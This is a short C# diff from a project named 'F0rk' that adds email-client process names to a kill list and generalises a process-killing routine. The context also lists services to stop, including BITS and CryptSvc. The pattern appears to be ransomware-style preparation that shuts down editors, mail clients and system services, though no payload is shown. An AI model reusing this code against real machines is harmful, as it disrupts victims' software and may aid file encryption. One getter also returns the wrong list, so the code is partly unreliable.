@@ -38,6 +38,12 @@ namespace F0rk.Classes
             "swriter.exe"
         };
 
+        private static readonly string[] EmailTasksNames =
+        {
+            "iexplore.exe",
+            "winmail.exe"
+        };
+
         private static readonly string[] Services =
         {
             "bits",
@@ -45,17 +51,21 @@ namespace F0rk.Classes
             "CryptSvc"
         };
 
-        public static Process[][] GetTasksToKill()
+        public static Process[][] GetTasksToKill(string[] tasks)
         {
-            var processes = new Process[Tasks.Length][];
+            var processes = new Process[tasks.Length][];
 
-            for (int i = 0; i < Tasks.Length; i++)
+            for (int i = 0; i < tasks.Length; i++)
             {
-                processes[i] = Process.GetProcessesByName(Tasks[i]);
+                processes[i] = Process.GetProcessesByName(tasks[i]);
             }
 
             return processes;
         }
+
+        public static string[] GetCommonTasksNames => EmailTasksNames;
+
+        public static string[] GetEmailTasksNames => EmailTasksNames;
 
         public static string[] GetServicesToStop => Services;
 
